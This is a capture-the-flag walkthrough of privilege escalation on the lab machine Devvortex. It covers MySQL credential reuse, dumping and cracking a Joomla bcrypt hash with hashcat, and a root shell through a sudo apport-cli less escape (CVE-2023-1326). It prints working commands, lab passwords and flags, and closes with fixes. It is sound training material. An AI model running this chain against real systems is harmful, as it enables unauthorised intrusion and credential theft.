# Devvortex — Privilege Escalation

> **Related:** [exploit.md](exploit.md) ← Initial access (www-data shell)  
> **Next:** [devvortex-writeup.md](../../writeups/devvortex-writeup.md) → Full attack chain summary

---

## Context

| Field | Value |
|-------|-------|
| **Entry user** | `www-data` (uid=33) |
| **Entry vector** | Joomla template webshell |
| **Goal** | Root shell + root flag |

---

## Phase 1 — MySQL Enumeration (www-data)

Using credentials recovered via CVE-2023-23752 (`lewis : P4ntherg0t1n5r3c0n##`):

```bash
mysql -u root -p -S /var/run/mysqld/mysqld.sock
# Password: P4ntherg0t1n5r3c0n##
```

```sql
USE joomla;
SELECT id, name, username, email, password FROM sd4fg_users;
```

| User | Email | Hash |
|------|-------|------|
| lewis | lewis@devvortex.htb | (Super User, used for admin) |
| logan | logan@devvortex.htb | `$2y$10$IT4k5kmSGvHSO9d6M/1w0eYiB5Ne9XzArQRFJTGThNiy/yBtkIj12` |

**Hash saved to:** [raw_data/logan.hash](raw_data/logan.hash)

---

## Phase 2 — Hash Cracking

**Format:** bcrypt (`$2y$10$...`) — Joomla 3.2+ default → **Hashcat mode `3200`**

```bash
# On attacker host
hashcat -m 3200 raw_data/logan.hash /usr/share/wordlists/rockyou.txt

# Result
Cracked password: tequieromucho
```

---

## Phase 3 — Lateral Movement to Logan

```bash
su - logan
# Password: tequieromucho
```

**User flag:**
```
/home/logan/user.txt → 0dfc82b91d415e89bc98395ca77b34d1
```

---

## Phase 4 — Sudo Discovery

```bash
sudo -l
```

```
User logan may run the following commands on devvortex:
    (ALL : ALL) ALL
    (ALL) NOPASSWD: /usr/bin/apport-cli
```

**Key finding:** logan can run `apport-cli` as root without a password.

---

## Phase 5 — Root via CVE-2023-1326

### CVE-2023-1326 — Quick Reference

| Field | Value |
|-------|-------|
| **Type** | Improper Privilege Management (CWE-269) |
| **Affected** | apport-cli ≤ 2.26.0 |
| **Target version** | 2.20.11 |
| **Ubuntu advisory** | USN-6018-1 |
| **GTFOBins** | [Yes](https://gtfobins.github.io/gtfobins/apport-cli/) |

**Mechanism:** `apport-cli` invokes `less` as root when displaying crash reports. The `less` pager's `!` command spawns a shell, which inherits root privileges.

### Step-by-Step

**1. Generate a crash file** (apport-cli requires one):
```bash
sleep 100 &
kill -11 $!
# Creates /var/crash/_usr_bin_bash.1000.crash
```

**2. Trigger the vulnerable binary:**
```bash
sudo /usr/bin/apport-cli -c /var/crash/_usr_bin_bash.1000.crash
```

**3. At the apport-cli menu, press `v`** to view the report (launches `less`)

**4. Inside `less`, press `!` then type `bash` and Enter:**
```
!
bash -p
```

**5. Verify root:**
```bash
id
# uid=0(root) gid=0(root) groups=0(root)
```

**Root flag:**
```
/root/root.txt → 940965a34100c537a67495b6c9c7c5c3
```

---

## Root → Full Exploit Chain

```
www-data (webshell)
    ↓ MySQL enum + hash extract
logan : tequieromucho  (cracked from sd4fg_users)
    ↓ sudo -l → NOPASSWD: apport-cli
sudo apport-cli -c /var/crash/... → less → !bash
    ↓
ROOT uid=0(gid=0)
```

---

## Prevention

| Vulnerability | Fix |
|---------------|-----|
| CVE-2023-23752 | Upgrade Joomla to 4.2.8+ |
| CVE-2023-1326 | Patch apport-cli (`apt update && apt upgrade apport`) |
| Sudo misconfiguration | Remove NOPASSWD rules for system binaries |
| Password reuse | Enforce unique passwords per service |
